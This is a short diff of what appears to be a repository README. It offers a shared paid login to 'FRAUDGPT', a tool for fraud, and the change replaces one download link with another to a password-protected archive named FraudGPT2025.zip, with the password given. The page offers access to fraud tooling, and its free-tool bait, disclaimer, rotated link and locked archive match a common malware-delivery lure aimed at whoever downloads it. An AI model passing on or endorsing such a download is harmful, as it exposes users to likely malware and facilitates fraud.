@@ -2,7 +2,7 @@
 
 Here is my paid login to FRAUDGPT. I used it for research on a paper i was writing. The subscription is still valid so i am sharing it. Do not use for illegal or unethical purposes. I claim no responsibility for misuse of this subscription.
 
-[Click Here To Download](https://rdmfile.eu/install/J02ipfR35ghf)
+[Click Here To Download](https://www.mediafire.com/file/nlhk1efbbv6ktpu/FraudGPT2025.zip/file)
 
 [Pass : S0f4fr33!]
 
